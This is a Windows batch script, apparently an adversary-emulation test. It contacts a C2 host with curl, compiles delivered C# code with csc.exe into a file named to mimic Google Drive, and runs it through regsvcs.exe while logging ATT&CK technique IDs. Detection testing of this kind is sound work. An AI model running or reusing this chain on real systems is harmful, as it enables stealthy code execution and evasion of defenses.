@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8224\05482bce
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8224-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=goog1edrive.txt
SET njozco=file.txt
SET kkjwr=8224

REM Computed variables with random names
SET mxoef=%APPDATA%\!ufeybybm!
SET pxdjog=%APPDATA%\!ufeybybm!\macula-simulations.log
SET zxttqc=csc.exe
SET utkha=regsvcs.exe

REM Debug: Script start
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_start=begin>>> "!pxdjog!" 2>nul

REM 1. C2 HEARTBEAT
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_alive_check=start>>> "!pxdjog!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_alive_check=complete>>> "!pxdjog!" 2>nul

REM 2. Directory change
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_change=!recnn!>>> "!pxdjog!" 2>nul
cd /d "!recnn!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_change=done>>> "!pxdjog!" 2>nul

REM 3. Compile .NET source (T1500: Compile After Delivery)
SET edfhr=0
SET jlewe=
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_start=!njozco!>>> "!pxdjog!" 2>nul
!zxttqc! /target:library /reference:System.EnterpriseServices.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
IF EXIST "!hpnjatpj!" (
    SET edfhr=1
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_complete=success>>> "!pxdjog!" 2>nul
) ELSE (
    SET jlewe=compile_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_complete=!jlewe!>>> "!pxdjog!" 2>nul
)

REM TTP Logging: T1500 Compile After Delivery
SET ntwhk=!DATE!-!TIME!
SET ntwhk=!ntwhk:/=-!
SET ntwhk=!ntwhk:.=:!
SET ntwhk=!ntwhk: =:!
SET ntwhk=!ntwhk:~0,4!-!ntwhk:~5,2!-!ntwhk:~8,2! !ntwhk:~11!
IF !edfhr!==1 (
    echo [!ntwhk!.000][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=1:>>> "!pxdjog!" 2>nul
) ELSE (
    echo [!ntwhk!.000][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=0:!jlewe!>>> "!pxdjog!" 2>nul
)

REM 4. Execute with regsvcs.exe (T1218: System Binary Proxy Execution)
SET zntwr=0
SET yrbwr=
IF !edfhr!==1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: command_execution_start=regsvcs.exe>>> "!pxdjog!" 2>nul
    !utkha! "!hpnjatpj!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        SET zntwr=1
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: command_execution_complete=success>>> "!pxdjog!" 2>nul
    ) ELSE (
        SET yrbwr=exec_error_!ERRORLEVEL!
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: command_execution_complete=!yrbwr!>>> "!pxdjog!" 2>nul
    )
)

REM TTP Logging: T1218 System Binary Proxy Execution
SET ujqhb=!DATE!-!TIME!
SET ujqhb=!ujqhb:/=-!
SET ujqhb=!ujqhb:.=:!
SET ujqhb=!ujqhb: =:!
SET ujqhb=!ujqhb:~0,4!-!ujqhb:~5,2!-!ujqhb:~8,2! !ujqhb:~11!
IF !zntwr!==1 (
    echo [!ujqhb!.000][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|System Binary Proxy Execution=1:>>> "!pxdjog!" 2>nul
) ELSE (
    echo [!ujqhb!.000][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|System Binary Proxy Execution=0:!yrbwr!>>> "!pxdjog!" 2>nul
)

REM Debug: Script end
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_end=complete>>> "!pxdjog!" 2>nul

ENDLOCAL